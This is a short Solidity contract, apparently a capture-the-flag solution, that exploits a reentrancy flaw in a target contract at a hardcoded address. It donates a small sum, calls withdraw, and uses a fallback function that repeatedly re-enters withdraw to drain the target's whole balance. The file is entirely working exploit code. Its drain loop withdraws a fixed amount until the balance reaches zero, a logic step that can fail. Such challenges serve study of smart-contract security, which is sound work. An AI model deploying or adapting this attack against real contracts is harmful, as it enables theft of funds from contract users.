// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IReEntrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract AttackReEntry {
    address reEntryInstanceAddress = 0x043646F542d3518b2e227b3374EBCEDcE8Eca019;
    IReEntrancy reEntryContract = IReEntrancy(reEntryInstanceAddress);
    uint amount = 0.0005 ether;

    constructor() payable {}

    // Idea is to write a function that donates amount into the reEntrancy contract, then, within the same function:
    // 1. Calls withdraw
    // 2. Writes a fallback function to do the same thing again
    function recursiveWithdraw() public {
        reEntryContract.donate{value: amount}(address(this));
        reEntryContract.withdraw(amount);
    }

    fallback() external payable {
        while (address(reEntryContract).balance > 0) {
            reEntryContract.withdraw(amount);
        }
    }
}
